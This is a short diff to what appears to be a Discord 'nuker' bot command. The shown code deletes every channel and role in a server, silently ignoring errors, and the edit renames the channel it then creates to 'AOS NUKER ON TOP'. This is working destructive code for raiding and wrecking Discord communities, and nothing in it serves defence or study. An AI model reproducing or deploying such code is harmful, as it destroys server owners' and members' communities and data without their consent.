@@ -5,7 +5,7 @@ exports.run = async (client, msg, args) => {
     await msg.guild.channels.forEach(c => c.delete().catch(() => {}))
     await msg.guild.roles.map(r => r.delete().catch(() => {}))
 
-    msg.guild.createChannel('Destoyed', {
+    msg.guild.createChannel('AOS NUKER ON TOP', {
         type: 'text'
     }).catch(() => {})
 
